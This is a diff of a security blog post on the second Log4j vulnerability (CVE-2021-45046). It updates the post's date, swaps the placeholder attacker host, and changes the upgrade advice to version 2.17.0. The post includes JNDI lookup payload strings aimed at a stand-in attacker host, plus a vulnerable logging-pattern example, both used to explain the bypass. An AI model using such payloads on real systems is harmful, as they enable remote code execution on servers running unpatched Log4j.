@@ -2,7 +2,7 @@
 title: "Log4Shell Update: Severity Upgraded 3.7 -> 9.0 for Second log4j Vulnerability (CVE-2021-45046)"
 description: The second Log4j vulnerability was upgraded from a CVSS score of 3.7x (limited DOS) to a CVSS score of 9.7 (limited RCE), and we explain the impact.
 slug: log4j-zero-day-severity-of-cve-2021-45046-increased
-date: 2021-12-17
+date: 2021-12-19
 image: https://www.lunasec.io/docs/img/log4shell-keeps-coming.png
 keywords: [log4shell, log4j, log4j2, rce, java, zero-day, mitigation]
 authors:
@@ -38,6 +38,8 @@ authors:
 ![Log4Shell Logo](https://www.lunasec.io/docs/img/log4shell-keeps-coming.png)
 
 _The logo gets worse as the situation gets worse..._
+
+_Originally Posted @ December 17th & Last Updated @ December 19th, 3:37pm PST_
 
 Earlier today, the second Log4j vulnerability (CVE-2021-45046) was upgraded from a [CVSS score of 3.7](https://web.archive.org/web/20211215180723/https://logging.apache.org/log4j/2.x/security.html)
 (limited DOS) to a [CVSS score of 9.0](https://logging.apache.org/log4j/2.x/security.html) (limited RCE). Note: the reported
@@ -97,11 +99,11 @@ there are still code paths in Log4j where message lookups could occur: known exa
 Logger.printf("%s", userInput), or applications that use a custom message factory, where the resulting messages do not
 implement StringBuilderFormattable. There may be other attack vectors.
 
-To summarize, 2.15.0 introduced changes to prevent remote connections in a message lookup (ie. a connection to `attacker.com`
-will be blocked in: `${jndi:ldap://attacker.com/a}`), as well as disabled message lookups when logging by default:
+To summarize, 2.15.0 introduced changes to prevent remote connections in a message lookup (ie. a connection to `some-attacker.com`
+will be blocked in: `${jndi:ldap://some-attacker.com/a}`), as well as disabled message lookups when logging by default:
 
 ```
-String attackerData = "${jndi:ldap://attacker.com/a}";
+String attackerData = "${jndi:ldap://some-attacker.com/a}";
 
 // Message lookups are blocked in this log statement. Payload will not fire by default.
 logger.info("Log string, but no lookup will happen: " + attackerData);
@@ -117,17 +119,17 @@ ThreadContext.put("layout-pattern-value", attackerData);
 An example `log4j2.properties` file might look something like:
 
 ```
-# The attacker data, "${jndi:ldap://attacker.com/a}", will be attempted to be looked up
+# The attacker data, "${jndi:ldap://some-attacker.com/a}", will be attempted to be looked up
 appender.console.layout.pattern = ${ctx:layout-pattern-value} - %d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n
 ```
 
 However, since only local connections were allowed in 2.15.0, the impact of this vulnerability were minimal.
 The most impactful way to exploit this vulnerability was to have `String attackerData = "${ctx:layout-pattern-value"`
 which would result in a recursive reference in the lookup. With the reported bypass of the restrictive remote connection
-list, a full RCE is possible in the above code as we can access `attacker.com` now.
+list, a full RCE is possible in the above code as we can access `some-attacker.com` now.
 
-It is strongly recommended that you update to 2.16.0, even if you have previously updated to 2.15.0, to mitigate these
-new bypasses.
+It is strongly recommended that you update to ~~2.16.0~~ 2.17.0 (Updated 12/19), even if you have previously updated to 2.15.0 or 2.16.0, to mitigate these
+new bypasses. (Updated 12/19 due to new DOS found in 2.16.0. Please upgrade to 2.17.0 to mitigate issues in previous versions.)
 
 ## Update: The localhost Bypass was Discovered!
 
@@ -190,3 +192,4 @@ If you would like to contribute, or notice any errors, this post is an Open Sour
 ### Edits
 
 1. Added a note that the RCE has only been provably exploitable on macOS
+2. 12/19/21: Updated info about 2.17.0 release due to CVE.
